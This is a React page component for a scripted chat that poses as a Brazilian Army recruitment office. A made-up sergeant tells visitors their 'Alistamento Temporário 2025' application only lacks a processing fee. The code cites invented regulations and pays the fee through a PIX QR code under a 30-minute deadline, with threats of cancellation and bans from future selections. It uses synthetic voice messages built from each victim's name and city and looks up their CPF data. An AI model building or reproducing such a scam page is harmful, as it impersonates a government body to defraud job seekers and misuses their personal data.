import { useState, useEffect, useRef } from "react";
import { useRoute, useLocation } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { AudioMessage } from "@/components/AudioMessage";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Loader2, MessageCircle, Send, Award, Copy, Check, QrCode } from "lucide-react";

interface ChatMessage {
  id: string;
  type: "user" | "bot";
  message: string;
  timestamp: Date;
  buttons?: string[];
  audioUrl?: string;
  isLoadingAudio?: boolean;
  hasAudio?: boolean;
}

interface CandidateData {
  id: number;
  name: string;
  email: string;
  cpf: string;
  phone: string;
  birthDate: string;
  gender: string;
  city: string;
  state: string;
  transaction: {
    transactionId: string;
    amount: string;
    status: string;
  };
}

export default function ConversarPage() {
  const [match, params] = useRoute("/conversar/:transaction_id");
  const [, setLocation] = useLocation();
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [candidateData, setCandidateData] = useState<CandidateData | null>(
    null,
  );
  const [userData, setUserData] = useState<any>(null);
  const [currentStep, setCurrentStep] = useState(1);
  const [showButtons, setShowButtons] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [showOfficerIntro, setShowOfficerIntro] = useState(false);
  const [officerImageUrl, setOfficerImageUrl] = useState("");
  const [officerIntroText, setOfficerIntroText] = useState("");
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  const transactionId = params?.transaction_id;

  // Fetch candidate data using the protocol API
  const { data: protocolResponse, isLoading: isLoadingProtocol } = useQuery({
    queryKey: [`/api/protocol/${transactionId}`],
    enabled: !!transactionId,
    retry: false,
  });

  // Check payment status immediately on page load
  const checkPaymentStatus = async () => {
    if (!transactionId) return;

    try {
      const response = await fetch(`/api/verificar-status-pagamento/${transactionId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const result = await response.json();
      
      if (result.success && result.data) {
        const status = result.data.status?.toUpperCase();
        
        // Redirect if payment is approved or paid
        if (status === 'APPROVED' || status === 'PAID') {
          setLocation(`/login-pos-pagamento?protocol_id=${transactionId}`);
        }
      }
    } catch (error) {
      console.error('Error checking payment status:', error);
    }
  };

  // Run payment status check on component mount
  useEffect(() => {
    checkPaymentStatus();
  }, [transactionId]);


  const generateAudio = async (text: string, gender: string): Promise<string | null> => {
    try {
      // Use specific voice IDs for conversar page
      const voiceId = gender === "feminino" ? "QJd9SLe6MVCdF6DR0EAu" : "SAA76GSoxwYgqvFLpT5j";
      
      const response = await fetch('/api/generate-audio', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: text.replace(/<[^>]*>/g, ''), // Remove HTML tags
          voice_id: voiceId
        }),
      });

      const result = await response.json();
      
      if (result.success && result.data?.audioUrl) {
        return result.data.audioUrl;
      }
      return null;
    } catch (error) {
      console.error("Erro ao gerar áudio:", error);
      return null;
    }
  };

  useEffect(() => {
    const processProtocolData = async () => {
      if (
        protocolResponse &&
        typeof protocolResponse === "object" &&
        "success" in protocolResponse
      ) {
        const response = protocolResponse as any;
        if (response.success && response.data) {
          const candidate = response.data.candidate;
          const transaction = response.data.transaction;
          const applicationData = response.data.additionalData?.applicationData;

          // Save complete user data
          setUserData(response.data);

          const city = applicationData?.additionalData?.juntaData?.municipio || response.data.additionalData.applicationData.juntasData.municipio;
           let gender = response.data?.additionalData?.applicationData?.gender || response.data?.additionalData?.applicationData?.userData?.autoFilledData?.sexo

          console.log("City:", city);
         console.log("Gender:", gender)
          // Se não tem gênero, buscar via API CPF
          if (!gender) {
            console.log("Gênero não encontrado na API protocol, buscando via CPF...");
            console.log("CPF do candidato:", candidate.cpf);
            console.log("Dados completos do candidato:", candidate);
            
            try {
              const cpfResponse = await fetch(`/api/verificar-cpf`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf: candidate.cpf })
              });
              const cpfData = await cpfResponse.json();
              
              if (cpfData.success && cpfData.data.DADOS && cpfData.data.DADOS.sexo) {
                gender = cpfData.data.DADOS.sexo; // M ou F
                console.log("Gênero obtido via CPF:", gender);
              } else {
                gender = "M"; // fallback
                console.log("Fallback para gênero masculino");
              }
            } catch (error) {
              console.log("Erro ao buscar gênero via CPF:", error);
              gender = "M"; // fallback
            }
          }
          
          // Normalizar gênero: F/f = feminino, M/m = masculino
          gender = gender.toLowerCase();
          setCandidateData({
            id: candidate.id,
            name: candidate.name,
            email: candidate.email,
            cpf: candidate.cpf,
            phone: candidate.phone,
            birthDate: candidate.birthDate,
            gender: gender,
            city: city,
            state: applicationData?.additionalData?.juntaData?.uf || "PA",
            transaction: {
              transactionId: transaction.transactionId,
              amount: transaction.amount,
              status: transaction.status,
            },
          });
        }
      }
    };

    processProtocolData();
  }, [protocolResponse]);
  useEffect(() => {
    if (!showPaymentModal || !transactionId) return;

    const pollPaymentStatus = async () => {
      try {
        const response = await fetch(`/api/verificar-status-pagamento/${transactionId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });

        const result = await response.json();

        if (result.success && result.data) {
          const status = result.data.status?.toUpperCase();

          // Redirect if payment is approved or paid
          if (status === 'APPROVED' || status === 'PAID') {
            setLocation(`/login-pos-pagamento?protocol_id=${transactionId}`);
          }
        }
      } catch (error) {
        console.error('Error polling payment status:', error);
      }
    };

    // Start polling every 1 second
    const interval = setInterval(pollPaymentStatus, 1000);

    // Cleanup interval when modal closes or component unmounts
    return () => clearInterval(interval);
  }, [showPaymentModal, transactionId]);
  // Initialize chat with officer introduction when candidate data is loaded
  useEffect(() => {
    if (candidateData && userData && chatMessages.length === 0) {
      // Setup officer intro based on gender
      const officer = getOfficerDetails();
      const imageUrl = candidateData.gender.toLowerCase() === "f" 
        ? "https://i.ibb.co/27L0VRFL/imagem-mulher-militar.png"
        : "https://i.ibb.co/bgHfgXtD/imagem-major.jpg";
      
      setOfficerImageUrl(imageUrl);
      const isFemale = candidateData.gender.toLowerCase() === "f";
      setOfficerIntroText(`${officer.name} ${officer.surname} irá orientá-${isFemale ? 'la' : 'lo'} sobre o processo de regularização documental.`);
      setShowOfficerIntro(true);

      // Show intro for 4.44 seconds then start conversation
      setTimeout(() => {
        setShowOfficerIntro(false);
        setIsTyping(true);

        setTimeout(() => {
          startInscricaoFunnel();
          setIsTyping(false);
        }, 2500); // Increased typing time
      }, 4440);
    }
  }, [candidateData, userData, chatMessages.length]);

  const generatePixPayment = async () => {
    if (!candidateData) return;

    try {
      const response = await fetch(`/api/verificar-status-pagamento/${candidateData.transaction.transactionId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const result = await response.json();
      
      if (result.success) {
        const pixTransaction = {
          id: result.data.id || candidateData.transaction.transactionId,
          qrCode: result.data.qr_code || result.data.qrCode,
          pixCode: result.data.pix_code || result.data.pixCode,
          amount: result.data.amount || candidateData.transaction.amount || '147.24',
          status: result.data.status || 'pending',
          createdAt: result.data.created_at || new Date().toISOString()
        };
        
        setPixData(pixTransaction);
        setShowPaymentModal(true);
      } else {
        console.error('Error fetching payment details:', result.error);
      }
    } catch (error) {
      console.error('Error fetching payment details:', error);
    }
  };

  const handleCopyPixCode = () => {
    if (!pixData?.pixCode) return;
    
    navigator.clipboard.writeText(pixData.pixCode).then(() => {
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 3000);
    });
  };

  const getOfficerDetails = () => {
    if (!candidateData) return { name: "", surname: "" };
    
    const isFemale = candidateData.gender.toLowerCase() === "f";
    
    // Always clear old cache and regenerate to ensure correct ranks
    localStorage.removeItem("officer-conversar");
    
    const surnames = [
      "Silva", "Santos", "Oliveira", "Souza", "Pereira", "Costa", "Rodrigues", 
      "Almeida", "Nascimento", "Lima", "Araújo", "Fernandes", "Carvalho", 
      "Gomes", "Martins", "Rocha", "Ribeiro", "Barbosa", "Teixeira", "Moura"
    ];
    const randomSurname = surnames[Math.floor(Math.random() * surnames.length)];
    
    const officerData = {
      name: isFemale ? "Sargento Ana Paula" : "1º Sargento Ricardo",
      surname: randomSurname,
    };
    
    localStorage.setItem("officer-conversar", JSON.stringify(officerData));
    return officerData;
  };

  const startInscricaoFunnel = () => {
    if (!candidateData || !userData) return;

    const firstName = candidateData.name.split(" ")[0];
    const { name: officerName, surname } = getOfficerDetails();
    const city = candidateData.city;
    const isFemale = candidateData.gender.toLowerCase() === "f";

    const step1Messages = [
      `<strong>CENTRAL DE PROCESSOS SELETIVOS - ${city.toUpperCase()}</strong>`,
      `${isFemale ? 'Prezada candidata' : 'Prezado candidato'} <strong>${firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()}</strong>.`,
      `Aqui é ${isFemale ? 'a' : 'o'} ${officerName} ${surname}, responsável pelo processamento de inscrições no <strong>Alistamento Temporário 2025</strong> na cidade de ${candidateData.city}`,
      `Verificamos que você iniciou o processo de candidatura para uma das <strong>85.000 vagas disponíveis</strong> em todo território nacional, porém sua inscrição encontra-se <strong>pendente de finalização</strong>.`,
      `Posso esclarecer sobre as etapas restantes e orientá-${isFemale ? 'la' : 'lo'} quanto aos procedimentos obrigatórios?`,
    ];

    // Gerar áudio para mensagens personalizadas (nome e cidade)
    const audioFlags = [false, true, true, false, false];
    sendMultipleMessages(step1Messages, ["Sim, preciso de esclarecimentos"], 3500, audioFlags);
    setCurrentStep(1);
  };

  const proceedToNextStep = (userResponse: string) => {
    if (!candidateData || !userData) return;

    const firstName = candidateData.name.split(" ")[0];
    const { name: officerName, surname } = getOfficerDetails();
    const city = candidateData.city;
    const isFemale = candidateData.gender.toLowerCase() === "f";

    switch (currentStep) {
      case 1:
        if (userResponse.toLowerCase().includes("sim") || userResponse.toLowerCase().includes("esclarecimentos")) {
          const step2Messages = [
            `Perfeito. Vou orientá-${isFemale ? 'la' : 'lo'} sobre o status atual de sua candidatura.`,
            `O <strong>Alistamento Temporário 2025</strong> segue as diretrizes da Portaria nº 8.454-EME, de 2025, que estabelece procedimentos para seleção de militares temporários.`,
            `Sua candidatura passou pelas seguintes validações:

• <strong>Verificação de dados pessoais</strong> ✓
• <strong>Análise de antecedentes criminais</strong> ✓  
• <strong>Confirmação de aptidão inicial</strong> ✓
• <strong>Definição de vaga compatível</strong> ✓
• <strong>Taxa de processamento de documentos</strong> ⏳`,
            `Todas as etapas foram <strong>aprovadas com êxito</strong>. Resta apenas a regularização da taxa administrativa para conclusão definitiva do processo.`,
            `É importante esclarecer a finalidade dessa taxa. Posso explicar os detalhes?`,
          ];
          sendMultipleMessages(step2Messages, ["Sim, preciso entender"]);
          setCurrentStep(2);
        }
        break;

      case 2:
        if (userResponse.toLowerCase().includes("sim") || userResponse.toLowerCase().includes("entender")) {
          const step3Messages = [
            `A <strong>Taxa de Processamento Documental</strong> no valor de setenta e oito reais e oitenta e cinco centavos está prevista na Instrução Normativa nº 15/2025 do Exército Brasileiro.`,
            `Esta taxa cobre exclusivamente os custos operacionais do processo seletivo:

• <strong>Análise e validação de documentos pessoais</strong>
• <strong>Consultas aos sistemas de segurança pública</strong>
• <strong>Processamento de exames médicos obrigatórios</strong>
• <strong>Emissão de protocolos e certificados oficiais</strong>
• <strong>Manutenção da infraestrutura do processo seletivo</strong>`,
            `Ressalto que não se trata de mensalidade ou taxa de matrícula. É uma <strong>contribuição única e obrigatória</strong> para viabilizar o processamento oficial de sua candidatura.`,
            `O não recolhimento desta taxa impede a conclusão do processo e resulta no <strong>cancelamento automático</strong> da candidatura, conforme Art. 23 do Regulamento.`,
            `${firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()} você gostaria de conhecer as oportunidades profissionais e benefícios oferecidos pelo programa?`,
          ];
          const audioFlags3 = [false, false, false, false, true];
          sendMultipleMessages(step3Messages, ["Sim, quero conhecer as oportunidades"], 3500, audioFlags3);
          setCurrentStep(3);
        }
        break;

      case 3:
        if (userResponse.toLowerCase().includes("sim") || userResponse.toLowerCase().includes("oportunidades")) {
          const step4Messages = [
            `${isFemale ? 'Sendo aprovada' : 'Sendo aprovado'}, você integrará um programa que oferece:`,
            `<strong>REMUNERAÇÃO E BENEFÍCIOS:</strong>
• Soldo militar: <strong>R$ 2.300 a R$ 8.847 mensais</strong>
• Adicional de alimentação: <strong>R$ 678,00</strong>
• Gratificações por localização especial
• 13º salário proporcional
• 30 dias de férias anuais`,
            `<strong>ASSISTÊNCIA COMPLETA:</strong>
• Assistência médico-odontológica integral
• Auxílio-farda e equipamentos fornecidos
• Formação profissional especializada
• Treinamento em tecnologias militares`,
            `<strong>RECONHECIMENTO PROFISSIONAL:</strong>
• Certificado de Reservista 2ª Categoria
• Pontuação adicional em concursos públicos
• Experiência militar valorizada no mercado
• Possibilidade de ingresso na carreira permanente`,
            `O programa prevê <strong>contratos de 8 meses a 10 anos</strong>, com possibilidade de renovação e progressão para carreiras permanentes após 4 anos de serviço exemplar.`,
            `Diante dessas oportunidades, gostaria de finalizar sua candidatura oficial?`,
          ];
          sendMultipleMessages(step4Messages, ["Sim, quero finalizar minha candidatura"]);
          setCurrentStep(4);
        }
        break;

      case 4:
        if (userResponse.toLowerCase().includes("sim") || userResponse.toLowerCase().includes("finalizar")) {
          const step5Messages = [
            `Excelente, ${firstName}! Decisão acertada.`,
            `<strong>COMUNICADO IMPORTANTE:</strong> O sistema registra um prazo de <strong>30 minutos</strong> para conclusão do pagamento da taxa administrativa.`,
            `<strong>Após o vencimento deste prazo:</strong>

• Sua candidatura será <strong>automaticamente cancelada</strong>
• Todos os dados do processo serão <strong>excluídos do sistema</strong>
• Será necessário reiniciar todo o procedimento de inscrição`,
            `<strong>OBSERVAÇÃO LEGAL:</strong> De acordo com o Art. 31 do Regulamento, o descumprimento de prazos processuais pode acarretar <strong>impedimento temporário</strong> para participação em futuras seleções do Exército.`,
            `Para garantir a regularização dentro do prazo, vou gerar sua <strong>Guia de Recolhimento Oficial</strong> agora. Autoriza a emissão?`,
          ];
          const audioFlags5 = [true, false, false, false, false];
          sendMultipleMessages(step5Messages, ["Sim, autorizo a emissão da guia"], 3500, audioFlags5);
          setCurrentStep(5);
        }
        break;

      case 5:
        if (userResponse.toLowerCase().includes("sim") || userResponse.toLowerCase().includes("autorizo")) {
          const examLocation = userData.examLocation?.name || userData.additionalData?.applicationData?.examLocation?.address || "Organização Militar de Destino";
          const currentTime = new Date();
          const expirationTime = new Date(currentTime.getTime() + 30 * 60000);
          const formattedTime = `${expirationTime.getHours().toString().padStart(2, "0")}:${expirationTime.getMinutes().toString().padStart(2, "0")}`;

          const step6Messages = [
            `<strong>GUIA DE RECOLHIMENTO EMITIDA COM SUCESSO</strong>`,
            `<strong>Valor da Taxa Administrativa:</strong> R$ 78,85
<strong>Prazo de Pagamento:</strong> até às ${formattedTime} (hoje)
<strong>Código de Receita:</strong> 6831 - Taxa de Processamento Documental`,
            `<strong>Finalidade Específica:</strong> Taxa Processamento Documental - Alistamento Temporário EB/2025`,
            `<strong>Organização de Recolhimento:</strong>
${examLocation}`,
            `<strong>PROCEDIMENTOS PÓS-PAGAMENTO:</strong>
• Confirmação automática no sistema em até 30 minutos
• Envio de instruções complementares via SMS e e-mail
• Ativação definitiva do protocolo de candidatura
• Convocação para próximas etapas conforme cronograma`,
            `Para acessar os dados de pagamento, clique no botão abaixo:`,
          ];
          sendMultipleMessages(step6Messages, ["Acessar Dados de Pagamento"], 2500);
          setCurrentStep(6);
        }
        break;

      case 6:
        if (userResponse.toLowerCase().includes("acessar") || userResponse.toLowerCase().includes("dados")) {
          generatePixPayment();
          return;
        } else if (userResponse.toLowerCase().includes("já paguei") || userResponse.toLowerCase().includes("efetuei")) {
          const step7Messages = [
            `<strong>Consultando sistema bancário...</strong>`,
            `Aguarde enquanto verificamos o status do pagamento nos sistemas integrados.`,
            `<strong>Observação:</strong> Pagamentos realizados há menos de 30 minutos podem necessitar de alguns instantes para processamento completo.`,
          ];
          sendMultipleMessages(step7Messages, ["Verificar Status Novamente"]);
          setCurrentStep(6);
        }
        break;
    }
  };

  const handleSendMessage = async (message: string = inputValue) => {
    if (!message.trim() || !candidateData || isTyping) return;

    const userMessage: ChatMessage = {
      id: Date.now().toString(),
      type: "user",
      message: message.trim(),
      timestamp: new Date(),
    };

    setChatMessages((prev) => [...prev, userMessage]);
    setInputValue("");
    setShowButtons(false);
    setIsTyping(true);

    setTimeout(() => {
      proceedToNextStep(message.trim());
      setIsTyping(false);
      inputRef.current?.focus();
    }, 3500);
  };

  const sendMultipleMessages = async (
    messages: string[],
    buttons?: string[],
    delay: number = 4000,
    shouldGenerateAudio: boolean[] = []
  ) => {
    setShowButtons(false);

    // Pre-generate all audio files before showing messages
    const audioUrls: (string | null)[] = [];
    for (let i = 0; i < messages.length; i++) {
      if (shouldGenerateAudio[i] && candidateData) {
        setIsRecordingAudio(true);
        const gender = candidateData.gender.toLowerCase() === "f" ? "feminino" : "masculino";
        const audioUrl = await generateAudio(messages[i], gender);
        setIsRecordingAudio(false);
        audioUrls[i] = audioUrl;
      } else {
        audioUrls[i] = null;
      }
    }

    for (let i = 0; i < messages.length; i++) {
      setIsTyping(true);

      await new Promise((resolve) => {
        setTimeout(() => {
          const hasSuccessfulAudio = shouldGenerateAudio[i] && !!audioUrls[i];
          
          const message: ChatMessage = {
            id: `${Date.now()}-${i}`,
            type: "bot",
            message: messages[i],
            timestamp: new Date(),
            buttons: i === messages.length - 1 ? buttons : undefined,
            hasAudio: hasSuccessfulAudio || false,
            audioUrl: audioUrls[i] || undefined,
            isLoadingAudio: false,
          };

          setChatMessages((prev) => [...prev, message]);
          setIsTyping(false);
          resolve(undefined);
        }, delay);
      });
    }

    // Only scroll after all messages are sent
    setTimeout(() => {
      const questionContainer = document.querySelector(".question-container");
      if (questionContainer) {
        console.log("Scrolling to bottom:" + questionContainer.scrollHeight);
        questionContainer.scrollTo({
          top: questionContainer.scrollHeight,
          behavior: "smooth",
        });
      }

      // Show buttons after scrolling
      if (buttons && buttons.length > 0) {
        setTimeout(() => setShowButtons(true), 300);
      }
    }, 500);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSendMessage();
    }
  };

  if (!match) {
    return <div>Página não encontrada</div>;
  }

  if (isLoadingProtocol) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex items-center space-x-3">
          <Loader2 className="h-6 w-6 animate-spin text-[#6a7d00]" />
          <span className="text-lg text-gray-700">Carregando...</span>
        </div>
      </div>
    );
  }

  if (!candidateData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="max-w-md mx-auto p-8 text-center">
          <h2 className="text-xl font-semibold text-red-600 mb-4">
            Protocolo não encontrado
          </h2>
          <p className="text-gray-600">
            Não foi possível encontrar os dados para o protocolo:{" "}
            {transactionId}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <ExercitoHeader />
      
      {showOfficerIntro && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 max-w-md mx-4 text-center shadow-2xl">
            <div className="mb-4">
              <img 
                src={officerImageUrl} 
                alt="Oficial responsável" 
                className="w-20 h-20 rounded-full mx-auto object-cover border-4 border-[#6a7d00]"
              />
            </div>
            <h3 className="text-lg font-bold text-[#6a7d00] mb-2">
              OFICIAL RESPONSÁVEL
            </h3>
            <p className="text-gray-700">
              {officerIntroText}
            </p>
          </div>
        </div>
      )}

      <div className="flex-1 flex flex-col max-w-4xl mx-auto w-full px-4 py-6">
        <div className="bg-gradient-to-r from-[#6a7d00] to-[#8db600] rounded-lg p-4 mb-6 text-white">
          <div className="flex items-center space-x-3">
            {candidateData && (
              <img 
                src={candidateData.gender.toLowerCase() === "f" 
                  ? "https://i.ibb.co/27L0VRFL/imagem-mulher-militar.png"
                  : "https://i.ibb.co/bgHfgXtD/imagem-major.jpg"
                } 
                alt="Oficial responsável" 
                className="w-12 h-12 rounded-full object-cover border-2 border-white"
              />
            )}
            <div>
              <h1 className="text-xl font-bold">Departamento de Regularização</h1>
              <p className="text-sm opacity-90">Taxa de Processamento - Alistamento Temporário 2025</p>
            </div>
          </div>
        </div>

        <div className="question-container flex-1 bg-gray-50 rounded-lg p-4 mb-4 overflow-y-auto max-h-[500px] space-y-4">
          {chatMessages.map((message) => (
            <div
              key={message.id}
              className={`flex ${message.type === "user" ? "justify-end" : "justify-start"}`}
            >
              <div
                className={`max-w-[80%] rounded-lg p-3 ${
                  message.type === "user"
                    ? "bg-[#6a7d00] text-white"
                    : "bg-white border border-gray-200"
                }`}
              >
                {/* Só exibe texto se não tiver áudio ou se for mensagem do usuário */}
                {(!message.hasAudio || message.type === "user") && (
                  <div 
                    className={`text-sm ${message.type === "user" ? "text-white" : "text-gray-800"}`}
                    dangerouslySetInnerHTML={{ __html: message.message }}
                  />
                )}
                
                {message.hasAudio && message.audioUrl && message.type === "bot" && (
                  <div className="">
                    <AudioMessage audioUrl={message.audioUrl} />
                  </div>
                )}
                
                {message.buttons && message.buttons.length > 0 && showButtons && (
                  <div className="mt-3 space-y-2">
                    {message.buttons.map((buttonText, index) => (
                      <Button
                        key={index}
                        onClick={() => handleSendMessage(buttonText)}
                        className="w-full bg-[#6a7d00] hover:bg-[#5a6d00] text-white text-sm"
                        size="sm"
                      >
                        {buttonText}
                      </Button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ))}

          {isRecordingAudio && (
            <div className="flex justify-start">
              <div className="bg-white border border-gray-200 rounded-lg p-3 max-w-[80%]">
                <div className="flex items-center space-x-2">
                  <div className="flex space-x-1">
                    <div className="w-2 h-2 bg-red-400 rounded-full animate-pulse" />
                    <div className="w-2 h-2 bg-red-400 rounded-full animate-pulse" style={{ animationDelay: "0.1s" }} />
                    <div className="w-2 h-2 bg-red-400 rounded-full animate-pulse" style={{ animationDelay: "0.2s" }} />
                  </div>
                  <span className="text-sm text-red-600">Gravando um áudio...</span>
                </div>
              </div>
            </div>
          )}
          
          {isTyping && (
            <div className="flex justify-start">
              <div className="bg-white border border-gray-200 rounded-lg p-3 max-w-[80%]">
                <div className="flex items-center space-x-2">
                  <div className="flex space-x-1">
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0.1s" }} />
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }} />
                  </div>
                  <span className="text-sm text-gray-500">Digitando...</span>
                </div>
              </div>
            </div>
          )}
          <div ref={messagesEndRef} />
        </div>
      </div>

      {/* Payment Modal */}
      <Dialog open={showPaymentModal} onOpenChange={() => {}}>
        <DialogContent className="max-w-md mx-auto [&>button]:hidden">
          <DialogHeader>
            <DialogTitle className="text-center text-[#6a7d00] font-bold">
              Guia de Pagamento PIX
            </DialogTitle>
          </DialogHeader>
          
          {pixData && (
            <div className="space-y-4">
              <div className="text-center">
                <div className="bg-white p-4 rounded-lg border-2 border-[#6a7d00] inline-block">
                  {pixData.pixCode ? (
                    <img 
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=192x192&data=${encodeURIComponent(pixData.pixCode)}`}
                      alt="QR Code PIX" 
                      className="w-48 h-48 mx-auto"
                      onError={(e) => {
                        e.currentTarget.style.display = 'none';
                        e.currentTarget.nextElementSibling?.classList.remove('hidden');
                      }}
                    />
                  ) : null}
                  <div className={`w-48 h-48 flex items-center justify-center bg-gray-100 rounded ${pixData.pixCode ? 'hidden' : ''}`}>
                    <QrCode className="w-16 h-16 text-gray-400" />
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between items-center">
                  <span className="font-semibold">Valor:</span>
                  <span className="text-lg font-bold text-[#6a7d00]">R$ {(() => {
                    const amount = pixData.amount || '78.85';
                    const numAmount = parseFloat(amount);
                    // Se o valor vier em centavos (como 7885), divide por 100
                    const finalAmount = numAmount > 1000 ? numAmount / 100 : numAmount;
                    return finalAmount.toFixed(2).replace('.', ',');
                  })()}</span>
                </div>
                
                <div className="border-t pt-2">
                  <p className="text-sm text-gray-600 mb-2">Código PIX Copia e Cola:</p>
                  <div className="bg-gray-50 p-2 rounded border text-xs break-all">
                    {pixData.pixCode || "Código não disponível"}
                  </div>
                </div>

                <Button
                  onClick={handleCopyPixCode}
                  className="w-full bg-[#6a7d00] hover:bg-[#5a6d00] text-white"
                  disabled={!pixData.pixCode}
                >
                  {isCopied ? (
                    <>
                      <Check className="w-4 h-4 mr-2" />
                      Copiado!
                    </>
                  ) : (
                    <>
                      <Copy className="w-4 h-4 mr-2" />
                      Copiar Código PIX
                    </>
                  )}
                </Button>
              </div>

              <div className="text-center text-xs text-gray-500">
                <p>Após o pagamento, sua inscrição será confirmada automaticamente.</p>
                <p className="mt-1 font-semibold text-red-600">
                  Esta guia expira em 30 minutos.
                </p>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <ExercitoFooter />
    </div>
  );
}